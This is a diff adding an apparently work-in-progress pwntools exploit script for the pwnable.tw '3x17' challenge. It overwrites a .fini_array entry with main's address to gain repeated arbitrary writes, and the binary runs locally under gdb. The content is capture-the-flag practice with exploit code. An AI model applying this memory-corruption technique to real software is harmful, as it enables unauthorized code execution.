@@ -1,0 +1,38 @@
+#! /usr/bin/env python
+from pwn import *
+import sys
+
+context.terminal = ['tmux', 'splitw', '-h']
+#context(log_level="error")
+#p = remote("chall.pwnable.tw", 10105)
+elf = ELF("./3x17")
+
+p = process("./3x17")
+gdb.attach(p,'b *0x401c29')
+
+
+start_addr = 0x4b40c0
+fini_start = 0x4b40f0
+addr_main = 0x401b6d
+fini_decon = 0x4b40f8
+
+# .fini_array 0x4b40f0
+# read function 0x446e20
+# write funciotn 0x446ec0
+# calling main 0x40227f
+
+p.recv()
+p.send(str(fini_decon))
+p.recv()
+p.send(p64(addr_main))
+p.interactive()
+
+'''
+for i in range(10):
+    p = process("./3x17")
+    p.recvuntil(b"addr:")
+    p.send(str(fini_start+(i*0x8)))
+    p.recvuntil(b"data:")
+    p.send(str(111111))
+    p.interactive()
+'''
